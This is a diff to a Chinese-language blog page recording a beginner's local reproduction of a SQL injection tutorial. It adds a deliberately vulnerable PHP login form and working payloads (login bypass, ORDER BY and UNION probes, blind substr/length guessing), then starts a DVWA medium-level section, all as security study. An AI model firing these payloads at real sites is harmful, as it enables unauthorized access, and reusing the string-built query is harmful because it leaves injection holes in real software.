@@ -116,7 +116,7 @@
 <meta property="og:site_name" content="Nina&#39;s Blog">
 <meta property="og:description" content="介绍继续中文。。。这就是用SQL注入的教程复现了一下，顺便memo一下自己作为一个初学者的理解。。。教程地址：米斯特白帽培训讲义 漏洞篇 SQL 注入 mac配置MySQL 下载安装，在“系统偏好设置”里面点击MySQL并运行。 配置环境变量： 1234echo $HOMEcd $HOMEsudo vim .bash_profileexport PATH=$&amp;#123;PATH&amp;#125;:/us">
 <meta property="og:locale" content="English">
-<meta property="og:updated_time" content="2018-10-01T13:59:35.000Z">
+<meta property="og:updated_time" content="2018-10-01T15:47:29.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLInjection1: php and MySQL">
 <meta name="twitter:description" content="介绍继续中文。。。这就是用SQL注入的教程复现了一下，顺便memo一下自己作为一个初学者的理解。。。教程地址：米斯特白帽培训讲义 漏洞篇 SQL 注入 mac配置MySQL 下载安装，在“系统偏好设置”里面点击MySQL并运行。 配置环境变量： 1234echo $HOMEcd $HOMEsudo vim .bash_profileexport PATH=$&amp;#123;PATH&amp;#125;:/us">
@@ -327,7 +327,7 @@
                 
               
 
-              <time title="Created: 2018-10-01 16:43:22 / Modified: 21:59:35" itemprop="dateCreated datePublished" datetime="2018-10-01T16:43:22+08:00">2018-10-01</time>
+              <time title="Created: 2018-10-01 16:43:22 / Modified: 23:47:29" itemprop="dateCreated datePublished" datetime="2018-10-01T16:43:22+08:00">2018-10-01</time>
             
 
             
@@ -416,6 +416,35 @@
 <li>已知名字长度去爆破每一位的字符: a ~ z 、 0 ~ 9 以及_的 ASCLL 十六进制</li>
 <li>找到名字再进入下一层</li>
 </ol>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>改了一改教程的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"GET"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;p&gt; log in: &lt;/p&gt;</span><br><span class="line">    Username: &lt;input type=<span class="string">"text"</span> name=<span class="string">"user"</span> /&gt;</span><br><span class="line">    Password: &lt;input type=<span class="string">"text"</span> name=<span class="string">"passwd"</span> /&gt;</span><br><span class="line">    &lt;br/&gt;</span><br><span class="line">    &lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"search"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$port = <span class="number">3306</span>;</span><br><span class="line">$un = <span class="string">''</span>;</span><br><span class="line">$pw = <span class="string">''</span>;</span><br><span class="line">$db = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">$Username = @$_GET[<span class="string">'user'</span>];</span><br><span class="line">$Passwd = @$_GET[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($Username == <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>($Passwd == <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">$conn = @mysql_connect($host . <span class="string">':'</span> . $port, $un, $pw);</span><br><span class="line"><span class="keyword">if</span>(!$conn)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Error in connecting database'</span> . mysql_error());</span><br><span class="line">mysql_select_db($db, $conn);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select id, user from sqlphp where user='$Username' and passwd='$Passwd'"</span>;</span><br><span class="line">$res = mysql_query($sql, $conn);</span><br><span class="line"><span class="keyword">if</span>(!$res)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error in searching'</span>. mysql_error());</span><br><span class="line">$num = mysql_num_rows($res);</span><br><span class="line"><span class="keyword">if</span>($num == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your username or password is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br><span class="line">    <span class="comment"># echo "&lt;p&gt;Hello, $Username&lt;/p&gt;";</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hello, &#123;$row[1]&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($conn);</span><br></pre></td></tr></table></figure>
+<p>没被注释掉的是有回显的，被注释掉的是没有回显的。</p>
+<h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><pre><code>username=1&apos; or &apos;1&apos;=&apos;1
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello admin, welcome!</p>
+<pre><code>username=admin&apos; order by 1#
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello admin, welcome!</p>
+<pre><code>username=admin&apos; order by 3#
+passwd=1&apos;or&apos;1&apos;=&apos;1
+</code></pre><p>=&gt; error …</p>
+<pre><code>username=1&apos; union select 1,2#
+passwd=1&apos;or&apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello 2, welcome!</p>
+<p>嘛后面就一样了</p>
+<h4 id="没有回显"><a href="#没有回显" class="headerlink" title="没有回显"></a>没有回显</h4><p>个人测试下来并不需要用ascii码的16进制而是直接用字符就可以了，不知道是不是MySQL的版本问题</p>
+<pre><code>username=1&apos; or (select length(database()))=11#
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello 1’ or (select length(database()))=11#, welcome!</p>
+<pre><code>username= 1&apos; or (select substr(database(),1,1))=&apos;e&apos;#
+passwd=1&apos; or &apos;1&apos;=&apos;1
+</code></pre><p>=&gt; Hello  1’ or (select substr(database(),1,1))=’e’#, welcome</p>
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>从这里开始换教程：<a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection</a><br>跳过low（因为和前面差不多），直接从medium开始。</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>增加函数：</p>
+<ul>
+<li>mysql_real_escape_string: 转义 SQL 语句中使用的字符串中的特殊字符: （例：1’ -&gt; 1\’）</li>
+</ul>
+<p>这种方法对数字型注入基本无效。。。<br>对自己写的字符型注入：</p>
 
       
     </div>
@@ -647,7 +676,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mac配置MySQL"><span class="nav-number">2.</span> <span class="nav-text">mac配置MySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写PHP并连接数据库"><span class="nav-number">3.</span> <span class="nav-text">写PHP并连接数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于回显的手工注入"><span class="nav-number">4.</span> <span class="nav-text">基于回显的手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#memo1-union"><span class="nav-number">4.1.</span> <span class="nav-text">memo1(union):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#memo2-limit"><span class="nav-number">4.2.</span> <span class="nav-text">memo2(limit):</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#没有回显的手工注入"><span class="nav-number">5.</span> <span class="nav-text">没有回显的手工注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mac配置MySQL"><span class="nav-number">2.</span> <span class="nav-text">mac配置MySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写PHP并连接数据库"><span class="nav-number">3.</span> <span class="nav-text">写PHP并连接数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于回显的手工注入"><span class="nav-number">4.</span> <span class="nav-text">基于回显的手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#memo1-union"><span class="nav-number">4.1.</span> <span class="nav-text">memo1(union):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#memo2-limit"><span class="nav-number">4.2.</span> <span class="nav-text">memo2(limit):</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#没有回显的手工注入"><span class="nav-number">5.</span> <span class="nav-text">没有回显的手工注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现"><span class="nav-number">6.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#有回显"><span class="nav-number">6.0.1.</span> <span class="nav-text">有回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#没有回显"><span class="nav-number">6.0.2.</span> <span class="nav-text">没有回显</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进阶"><span class="nav-number">7.</span> <span class="nav-text">进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium"><span class="nav-number">7.1.</span> <span class="nav-text">Medium</span></a></li></ol></li></ol></div>
             
 
           </div>
